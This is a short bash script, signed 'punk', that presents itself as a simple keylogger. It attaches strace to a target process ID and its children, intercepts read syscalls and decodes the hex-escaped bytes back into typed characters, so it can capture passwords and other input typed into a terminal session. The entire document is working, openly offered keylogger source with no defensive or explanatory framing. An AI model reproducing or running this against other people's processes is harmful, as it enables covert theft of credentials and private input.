#!/bin/bash
#author: punk
#comment: simple bash keylogger

usage () {
    echo "./keylog PID"
    exit 1
}

[ -z $1 ] && usage

strace -p $1 -f -eread -xx 2>&1 | while read line ; do
    char=$( echo $line | cut -f2 -d, | tr -d '"' | cut -c2- )
    if [[ $char == *"x0d"* ]] ; then
        echo -en "\n"
    elif [[ $char == *"x7f"* ]] ; then
        echo -en "\b \b"
    else
        echo -en "\\$char"
    fi
done
